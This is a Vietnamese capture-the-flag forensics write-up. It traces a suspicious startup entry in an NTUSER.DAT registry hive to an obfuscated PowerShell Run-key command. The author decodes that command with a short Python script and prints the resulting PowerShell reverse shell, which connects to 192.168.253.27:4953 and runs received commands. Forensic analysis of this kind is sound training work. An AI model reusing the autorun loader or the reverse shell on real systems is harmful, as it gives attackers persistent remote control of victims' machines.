====
**SỔ ĐĂNG KÍ 200 POINTS**

Lưu ý: đây là cách mình đã suy nghĩ xuyên suốt cả bài cho tới khi tìm thấy flag, nếu mọi người muốn nhanh gọn lẹ thì hãy nhảy tới TLDR giúp mình, mình xin cảm ơn 


**Link tải file:** [tại đây]()
Download file đề về thì ta có một file `NTUSER.DAT`. 
Theo như trang [này](https://vi.phhsnews.com/articles/howto/what-is-the-ntuser-dat-file-in-windows.html) thì ta có thể hấy được đây chính là một file được lưu bên trong Registry của hệ thống. Vì thế chúng ta sẽ sử dụng [RegistryExplorer](https://www.sans.org/tools/registry-explorer/)

Theo như description của đề: 
`Hòa thấy hiện tượng lạ mỗi khi anh ta khởi động máy tính. Anh ta nghĩ rằng việc tải các video không lành mạnh gần đây đã khiến máy tính của anh ta bị hack.`

Ta có thể thấy được là có vấn đề ở việc khởi động máy tính. Vì thế sau khi research một số thứ thì ta có thể thấy được rằng thì trong folder `RUN` chứa một đoạn Powershell

<p align="center">
  <img src="https://github.com/P5ySm1th/CTF/assets/100250271/d9dc3535-57b7-49e0-96c9-744477b08310">
</p>

Ta có thể thấy rằng bên trong folder run có chứa một đoạn mã được viết bằng `Powershell` như sau: 
```
"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" "(neW-obJEct io.COMprEssIon.dEFlATesTReAm( [sySTem.IO.memorYSTREam] [coNVeRT]::FRoMBAse64stRInG( 'TVFva4JAGP8qh7hxx/IwzbaSBZtsKwiLGexFhJg+pMs09AmL6rvP03S9uoe739/nZD+OIEHySmwolNn6F3wkzilH2HEbkDupvwXM+cKaWxWSSt2Bxrv9F64ZOteepU5vYOjMlHPMwNuVQnItyb8AneqOMnO5PiEsVytZnHkJUjnvG4ZuXB7O6tUswigGSuVI0Gsh/g1eQGt8h6gdUo98CskGQ8aIkgBR2dmUAw+9kkfvCiiL0x5sbwdNlQUckb851mTykfhpECUbdstXjo2LMIlEE0iCtedvhWgER1I7aKPHLrmQ2QGVmkbuoFoVvOE9Eckaj8+26vbcTeomqptjL3OLUM/0q1Q+030RMD73MBTYEZFuSmUMYbpEERduSVfDYZW8SvwuktJ/33bx/CeLEGirU7Zp52ZpLfYzPuQhZVez+SsrTnOg7A8='), [SYSTEM.iO.ComPReSSion.CoMPrEsSIonmODe]::DeCOmpresS)|FOREAcH-object{ neW-obJEct io.streAMrEadeR( $_,[sysTem.TExt.EnCoDING]::asCIi )}).reaDToEnD()|inVOKe-exprEsSIon"`

```
Nhìn tổng quan qua câu lệnh này thì có vẻ như là nó đang kích hoạt powershell để có thể gọi tới một câu lệnh nào đó, Format lại câu lệnh Powershell ta được: 

```
"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" "(New-Object IO.Compression.DeflateStream([System.IO.MemoryStream][System.Convert]::FromBase64String('TVFva4JAGP8qh7hxx/IwzbaSBZtsKwiLGexFhJg+pMs09AmL6rvP03S9uoe739/nZD+OIEHySmwolNn6F3wkzilH2HEbkDupvwXM+cKaWxWSSt2Bxrv9F64ZOteepU5vYOjMlHPMwNuVQnItyb8AneqOMnO5PiEsVytZnHkJUjnvG4ZuXB7O6tUswigGSuVI0Gsh/g1eQGt8h6gdUo98CskGQ8aIkgBR2dmUAw+9kkfvCiiL0x5sbwdNlQUckb851mTykfhpECUbdstXjo2LMIlEE0iCtedvhWgER1I7aKPHLrmQ2QGVmkbuoFoVvOE9Eckaj8+26vbcTeomqptjL3OLUM/0q1Q+030RMD73MBTYEZFuSmUMYbpEERduSVfDYZW8SvwuktJ/33bx/CeLEGirU7Zp52ZpLfYzPuQhZVez+SsrTnOg7A8='), [System.IO.Compression.CompressionMode]::Decompress) | ForEach-Object { New-Object IO.StreamReader($_, [System.Text.Encoding]::ASCII) }).ReadToEnd() | Invoke-Expression"
```

Thì ta thấy rằng đâu là một câu lệnh `Powershell` để kích hoạt lên một đoạn code được mã hóa bằng base64. Thử lên [Cyberchef](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)&input=VFZGdmE0SkFHUDhxaDdoeHgvSXd6YmFTQlp0c0t3aUxHZXhGaEpnK3BNczA5QW1MNnJ2UDAzUzl1b2U3MzkvblpEK09JRUh5U213b2xObjZGM3dremlsSDJIRWJrRHVwdndYTStjS2FXeFdTU3QyQnhydjlGNjRaT3RlZXBVNXZZT2pNbEhQTXdOdVZRbkl0eWI4QW5lcU9Nbk81UGlFc1Z5dFpuSGtKVWpudkc0WnVYQjdPNnRVc3dpZ0dTdVZJMEdzaC9nMWVRR3Q4aDZnZFVvOThDc2tHUThhSWtnQlIyZG1VQXcrOWtrZnZDaWlMMHg1c2J3ZE5sUVVja2I4NTFtVHlrZmhwRUNVYmRzdFhqbzJMTUlsRUUwaUN0ZWR2aFdnRVIxSTdhS1BITHJtUTJRR1Zta2J1b0ZvVnZPRTlFY2thajgrMjZ2YmNUZW9tcXB0akwzT0xVTS8wcTFRKzAzMFJNRDczTUJUWUVaRnVTbVVNWWJwRUVSZHVTVmZEWVpXOFN2d3VrdEovMzNieC9DZUxFR2lyVTdacDUyWnBMZll6UHVRaFpWZXorU3NyVG5PZzdBOD0) decode base64 thì ta được như hình dưới đây:


<p align="center">
  <img src="https://github.com/P5ySm1th/CTF/assets/100250271/995776d2-9068-4556-b382-2298bb08817f">
</p>
    
Thì mình thấy rằng decode Base64 theo cách bình thường không được nên đã lên ChatGPT hỏi xem có cách nào để decode Base64 theo cách khác không ? Đoạn chat có thể xem [tại đây](https://chat.openai.com/share/7d02e53f-a796-41f6-9231-a4e048539ed2?fbclid=IwAR2RrmsAAVj9PEWfBwMBa5s6i9P5eLLhExb1xapt6pUBDivHv4Se59W9jVc)

Chỉnh sửa đoạn code lại tí xíu và ta đã có được một payload như sau: 

```
import zlib
import base64
import subprocess

encoded_string = 'TVFva4JAGP8qh7hxx/IwzbaSBZtsKwiLGexFhJg+pMs09AmL6rvP03S9uoe739/nZD+OIEHySmwolNn6F3wkzilH2HEbkDupvwXM+cKaWxWSSt2Bxrv9F64ZOteepU5vYOjMlHPMwNuVQnItyb8AneqOMnO5PiEsVytZnHkJUjnvG4ZuXB7O6tUswigGSuVI0Gsh/g1eQGt8h6gdUo98CskGQ8aIkgBR2dmUAw+9kkfvCiiL0x5sbwdNlQUckb851mTykfhpECUbdstXjo2LMIlEE0iCtedvhWgER1I7aKPHLrmQ2QGVmkbuoFoVvOE9Eckaj8+26vbcTeomqptjL3OLUM/0q1Q+030RMD73MBTYEZFuSmUMYbpEERduSVfDYZW8SvwuktJ/33bx/CeLEGirU7Zp52ZpLfYzPuQhZVez+SsrTnOg7A8='

decoded_data = base64.b64decode(encoded_string)
decompressed_data = zlib.decompress(decoded_data, -15)

print(decompressed_data)
```

Thì ta có kết quả sau: 
```
b'$client = New-Object System.Net.Sockets.TCPClient("192.168.253.27",4953);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "CHH{N0_4_go_n0_st4r_wh3r3}" + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
```

Và chúng ta đã ra được phần flag

### Flag: CHH{N0_4_go_n0_st4r_wh3r3}

TLDR
===
* Nhận thấy file `NTUSSER.dat` mở bằng Registry Explorer 
* Dùng đoạn payload để giải mã base64
* Ra flag
